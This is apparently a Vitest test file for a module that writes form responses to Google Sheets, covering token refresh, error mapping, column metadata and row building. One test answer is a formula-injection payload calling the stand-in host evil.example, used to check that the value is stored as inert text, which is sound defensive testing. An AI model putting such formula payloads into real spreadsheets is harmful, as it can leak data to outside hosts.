import { readFileSync } from "node:fs";
import { answerFields, parseForm, type Form } from "@freelyforms/form-schema";
import { describe, expect, it } from "vitest";
import {
  addMissingColumns,
  addResponseTab,
  syncHeaders,
  answerCell,
  appendRows,
  buildRow,
  createResponseSpreadsheet,
  errorFromResponse,
  GoogleApiError,
  headerLabels,
  refreshAccessToken,
  revokeToken,
  resolveColumns,
  sheetsClient,
  SYSTEM_COLUMNS,
} from "./index.js";

const form = (() => {
  const url = new URL("../../form-schema/fixtures/all-fields.json", import.meta.url);
  const result = parseForm(JSON.parse(readFileSync(url, "utf8")));
  if (!result.success) throw new Error("fixture");
  return result.form;
})();

interface Call {
  url: string;
  method: string;
  auth: string | null;
  body: unknown;
}

/** Fake fetch that records calls and replies from a queue. */
function fake(...replies: (Response | Error)[]) {
  const calls: Call[] = [];
  const fetchFn: typeof fetch = (input, init) => {
    const headers = new Headers(init?.headers);
    const raw = init?.body;
    calls.push({
      url: typeof input === "string" ? input : input instanceof URL ? input.href : input.url,
      method: init?.method ?? "GET",
      auth: headers.get("authorization"),
      body:
        typeof raw === "string" && raw.startsWith("{")
          ? JSON.parse(raw)
          : raw instanceof URLSearchParams
            ? Object.fromEntries(raw)
            : raw,
    });
    const reply = replies.shift() ?? Response.json({});
    return reply instanceof Error ? Promise.reject(reply) : Promise.resolve(reply);
  };
  return { fetchFn, calls };
}

const googleError = (status: number, reason?: string, message?: string) =>
  Response.json(
    { error: { code: status, message, errors: reason ? [{ reason }] : [] } },
    { status },
  );

describe("refreshAccessToken", () => {
  const args = { clientId: "id", clientSecret: "secret", refreshToken: "1//r", now: 1_000_000 };

  it("returns the access token with an early expiry", async () => {
    const { fetchFn, calls } = fake(
      Response.json({
        access_token: "ya29.x",
        expires_in: 3599,
        scope: "openid https://www.googleapis.com/auth/drive.file",
      }),
    );
    const token = await refreshAccessToken(fetchFn, args);
    expect(token).toEqual({
      token: "ya29.x",
      expiresAt: 1_000_000 + 3539 * 1000,
      scopes: ["openid", "https://www.googleapis.com/auth/drive.file"],
    });
    expect(calls[0]?.body).toMatchObject({ grant_type: "refresh_token", refresh_token: "1//r" });
  });

  it.each([
    [Response.json({ error: "invalid_grant" }, { status: 400 }), "ACCESS_REVOKED"],
    [new Response("oops", { status: 503 }), "TRANSIENT"],
    [new TypeError("network down"), "TRANSIENT"],
    // Our own misconfiguration must never look like every owner revoking access.
    [Response.json({ error: "invalid_client" }, { status: 401 }), "TRANSIENT"],
    [Response.json({ error: "unauthorized_client" }, { status: 400 }), "TRANSIENT"],
  ])("classifies failures (%#)", async (reply, kind) => {
    const { fetchFn } = fake(reply);
    await expect(refreshAccessToken(fetchFn, args)).rejects.toMatchObject({ kind });
  });
});

describe("revokeToken", () => {
  it.each([
    [new Response(null, { status: 200 }), true],
    [Response.json({ error: "invalid_token" }, { status: 400 }), true],
    [new Response("oops", { status: 503 }), false],
    [new TypeError("network down"), false],
  ])("reports whether the grant is gone (%#)", async (reply, expected) => {
    const { fetchFn, calls } = fake(reply);
    expect(await revokeToken(fetchFn, "1//r")).toBe(expected);
    expect(calls[0]?.body).toMatchObject({ token: "1//r" });
  });
});

describe("errorFromResponse", () => {
  it.each([
    [googleError(429), "QUOTA", true],
    [googleError(403, "rateLimitExceeded"), "QUOTA", true],
    [googleError(500), "TRANSIENT", true],
    [googleError(401), "ACCESS_REVOKED", false],
    [googleError(403, "forbidden"), "ACCESS_REVOKED", false],
    [googleError(404), "SHEET_DELETED", false],
    [
      googleError(400, undefined, "Invalid requests[0].appendCells: No grid with id: 7"),
      "TAB_MISSING",
      false,
    ],
    [googleError(400, "badRequest", "Invalid value"), "INVALID_REQUEST", false],
  ])("maps %# to %s", async (res, kind, retryable) => {
    const err = await errorFromResponse(res);
    expect(err).toBeInstanceOf(GoogleApiError);
    expect(err.kind).toBe(kind);
    expect(err.retryable).toBe(retryable);
  });
});

describe("createResponseSpreadsheet", () => {
  it("creates a frozen, bold header with system columns first and tags every column", async () => {
    const { fetchFn, calls } = fake(
      Response.json({
        spreadsheetId: "S1",
        spreadsheetUrl: "https://docs.google.com/x",
        sheets: [{ properties: { sheetId: 42 } }],
      }),
      Response.json({}),
    );
    const dest = await createResponseSpreadsheet(sheetsClient(fetchFn, "ya29.t"), {
      title: "Responses: Event",
      form,
    });
    expect(dest).toEqual({ spreadsheetId: "S1", sheetId: 42, url: "https://docs.google.com/x" });
    expect(calls.every((c) => c.auth === "Bearer ya29.t")).toBe(true);

    const create = calls[0]?.body as {
      sheets: {
        properties: unknown;
        data: { rowData: { values: { userEnteredValue: { stringValue: string } }[] }[] }[];
      }[];
    };
    const header = create.sheets[0]?.data[0]?.rowData[0]?.values.map(
      (v) => v.userEnteredValue.stringValue,
    );
    expect(header?.slice(0, 3)).toEqual([...SYSTEM_COLUMNS]);
    // Page breaks are not answers and get no column (ADR 0018).
    expect(header?.slice(3)).toEqual(answerFields(form).map((f) => f.label));
    expect(header).not.toContain("About you");
    expect(create.sheets[0]?.properties).toMatchObject({
      title: "Responses",
      gridProperties: { frozenRowCount: 1 },
    });

    expect(calls[1]?.url).toBe("https://sheets.googleapis.com/v4/spreadsheets/S1:batchUpdate");
    const requests = (
      calls[1]?.body as {
        requests: { createDeveloperMetadata: { developerMetadata: Record<string, unknown> } }[];
      }
    ).requests;
    expect(requests).toHaveLength(3 + answerFields(form).length);
    expect(requests[3]?.createDeveloperMetadata.developerMetadata).toEqual({
      metadataKey: "app_field_id",
      metadataValue: form.fields[0]?.id,
      visibility: "PROJECT",
      location: {
        dimensionRange: { sheetId: 42, dimension: "COLUMNS", startIndex: 3, endIndex: 4 },
      },
    });
  });

  it("disambiguates duplicate labels", () => {
    expect(
      headerLabels({
        fields: [
          { id: "fld_a", type: "text", label: "Name" },
          { id: "fld_b", type: "text", label: "Name" },
        ],
      }),
    ).toEqual(["Name", "Name (2)"]);
  });
});

describe("columns", () => {
  const dest = { spreadsheetId: "S1", sheetId: 42 };
  const meta = (value: string, sheetId: number, startIndex: number) => ({
    developerMetadata: {
      metadataValue: value,
      location: { dimensionRange: { sheetId, startIndex } },
    },
  });

  it("resolves columns of the destination tab only, wherever the owner moved them", async () => {
    const { fetchFn } = fake(
      Response.json({
        matchedDeveloperMetadata: [
          meta("_submission_id", 42, 0),
          meta("fld_name", 42, 7),
          meta("fld_name", 99, 1),
        ],
      }),
    );
    const columns = await resolveColumns(sheetsClient(fetchFn, "t"), dest);
    expect([...columns]).toEqual([
      ["_submission_id", 0],
      ["fld_name", 7],
    ]);
  });

  it("appends columns for new fields after every existing column, including the owner's", async () => {
    // Columns 0–6 are tagged; the owner added an untagged "Notes" column at index 7.
    const { fetchFn, calls } = fake(
      Response.json({
        sheets: [
          { properties: { sheetId: 1, gridProperties: { columnCount: 3 } } },
          { properties: { sheetId: 42, gridProperties: { columnCount: 8 } } },
        ],
      }),
      Response.json({}),
    );
    const small: Pick<Form, "fields"> = {
      fields: [
        { id: "fld_old", type: "text", label: "Old" },
        { id: "fld_new", type: "email", label: "New" },
      ],
    };
    const columns = new Map([
      ["_submission_id", 0],
      ["fld_old", 5],
      ["fld_removed", 6],
    ]);
    const updated = await addMissingColumns(sheetsClient(fetchFn, "t"), dest, small, columns);
    expect(updated.get("fld_new")).toBe(8);
    expect(updated.get("fld_removed")).toBe(6);
    expect(calls[0]?.method).toBe("GET");
    const requests = (calls[1]?.body as { requests: Record<string, unknown>[] }).requests;
    expect(requests[0]).toEqual({
      appendDimension: { sheetId: 42, dimension: "COLUMNS", length: 1 },
    });
    expect(JSON.stringify(requests[1])).toContain('"columnIndex":8');
  });

  it("reports a deleted tab when adding columns", async () => {
    const { fetchFn } = fake(Response.json({ sheets: [{ properties: { sheetId: 1 } }] }));
    await expect(
      addMissingColumns(
        sheetsClient(fetchFn, "t"),
        dest,
        { fields: [{ id: "fld_x", type: "text", label: "X" }] },
        new Map(),
      ),
    ).rejects.toMatchObject({ kind: "TAB_MISSING" });
  });

  it("does not call Google when nothing is missing", async () => {
    const { fetchFn, calls } = fake();
    const columns = new Map([["fld_a", 3]]);
    await addMissingColumns(
      sheetsClient(fetchFn, "t"),
      dest,
      { fields: [{ id: "fld_a", type: "text", label: "A" }] },
      columns,
    );
    expect(calls).toHaveLength(0);
  });
});

describe("addResponseTab", () => {
  it("adds a tab with header and metadata, renaming when the title is taken", async () => {
    const { fetchFn, calls } = fake(
      Response.json(
        {
          error: {
            code: 400,
            message: 'A sheet with the name "Contact responses" already exists.',
          },
        },
        { status: 400 },
      ),
      Response.json({ replies: [{ addSheet: { properties: { sheetId: 99 } } }] }),
      Response.json({}),
    );
    const small: Pick<Form, "fields"> = { fields: [{ id: "fld_a", type: "text", label: "A" }] };
    const dest = await addResponseTab(sheetsClient(fetchFn, "t"), "sheet123", {
      title: "Contact responses",
      form: small,
    });
    expect(dest).toEqual({ spreadsheetId: "sheet123", sheetId: 99 });
    expect(JSON.stringify(calls[1]?.body)).toContain('"title":"Contact responses (2)"');
    const requests = (calls[2]?.body as { requests: Record<string, unknown>[] }).requests;
    expect(JSON.stringify(requests[0])).toContain('"stringValue":"_submission_id"');
    expect(requests.filter((r) => "createDeveloperMetadata" in r)).toHaveLength(4);
  });

  it("reports a spreadsheet the app cannot open", async () => {
    const { fetchFn } = fake(googleError(404));
    await expect(
      addResponseTab(sheetsClient(fetchFn, "t"), "nope", { title: "x", form: { fields: [] } }),
    ).rejects.toMatchObject({ kind: "SHEET_DELETED" });
  });
});

describe("syncHeaders", () => {
  const dest = { spreadsheetId: "sheet1", sheetId: 42 };
  const small = (label: string): Pick<Form, "fields"> => ({
    fields: [{ id: "fld_a", type: "text", label }],
  });
  it("renames a header that still shows the old label, and leaves an edited one alone", async () => {
    const columns = new Map([["fld_a", 3]]);
    const kept = fake(
      Response.json({ valueRanges: [{ valueRange: { values: [["", "", "", "Edited"]] } }] }),
    );
    await syncHeaders(sheetsClient(kept.fetchFn, "t"), dest, small("New"), small("Old"), columns);
    expect(kept.calls).toHaveLength(1); // read only, no write
    const renamed = fake(
      Response.json({ valueRanges: [{ valueRange: { values: [["", "", "", "Old"]] } }] }),
      Response.json({}),
    );
    await syncHeaders(
      sheetsClient(renamed.fetchFn, "t"),
      dest,
      small("New"),
      small("Old"),
      columns,
    );
    expect(JSON.stringify(renamed.calls[1]?.body)).toContain('"stringValue":"New"');
  });
  it("does nothing when no question was renamed", async () => {
    const none = fake();
    await syncHeaders(
      sheetsClient(none.fetchFn, "t"),
      dest,
      small("Same"),
      small("Same"),
      new Map([["fld_a", 0]]),
    );
    expect(none.calls).toHaveLength(0);
  });
});

describe("rows", () => {
  it("writes typed cells, option labels and system columns at their resolved positions", () => {
    const columns = new Map<string, number>([
      ["_submission_id", 0],
      ["_submitted_at", 1],
      ["_form_version", 2],
      ["fld_name", 5],
      ["fld_guests", 3],
      ["fld_sessions", 4],
      ["fld_ticket", 6],
      ["fld_consent", 8],
    ]);
    const row = buildRow(form, columns, {
      submissionId: "01JABC",
      submittedAt: Date.UTC(2026, 9, 16, 1, 2, 3),
      formVersion: 3,
      values: {
        fld_name: '=IMPORTXML("https://evil.example","//a")',
        fld_guests: 2,
        fld_sessions: ["opt_morning", "opt_evening"],
        fld_ticket: "opt_vip",
        fld_consent: true,
      },
    });
    expect(row).toEqual([
      { userEnteredValue: { stringValue: "01JABC" } },
      { userEnteredValue: { stringValue: "2026-10-16T01:02:03.000Z" } },
      { userEnteredValue: { numberValue: 3 } },
      { userEnteredValue: { numberValue: 2 } },
      { userEnteredValue: { stringValue: "Morning, Evening" } },
      { userEnteredValue: { stringValue: '=IMPORTXML("https://evil.example","//a")' } },
      { userEnteredValue: { stringValue: "VIP" } },
      {},
      { userEnteredValue: { boolValue: true } },
    ]);
  });

  it("leaves unanswered and unmapped fields empty", () => {
    expect(answerCell({ id: "fld_a", type: "text", label: "A" }, undefined)).toEqual({});
    expect(
      buildRow(form, new Map(), { submissionId: "x", submittedAt: 0, formVersion: 1, values: {} }),
    ).toEqual([]);
  });

  it("appends all rows of a batch in one AppendCells request by tab ID", async () => {
    const { fetchFn, calls } = fake(Response.json({}));
    const client = sheetsClient(fetchFn, "t");
    await appendRows(client, { spreadsheetId: "S1", sheetId: 42 }, [
      [{ userEnteredValue: { stringValue: "a" } }],
      [{}],
    ]);
    await appendRows(client, { spreadsheetId: "S1", sheetId: 42 }, []);
    expect(calls).toHaveLength(1);
    expect(calls[0]?.body).toEqual({
      requests: [
        {
          appendCells: {
            sheetId: 42,
            rows: [{ values: [{ userEnteredValue: { stringValue: "a" } }] }, { values: [{}] }],
            fields: "userEnteredValue",
          },
        },
      ],
    });
  });

  it("turns HTTP failures into classified errors", async () => {
    const { fetchFn } = fake(googleError(404));
    await expect(
      appendRows(sheetsClient(fetchFn, "t"), { spreadsheetId: "gone", sheetId: 1 }, [[{}]]),
    ).rejects.toMatchObject({
      kind: "SHEET_DELETED",
    });
  });
});
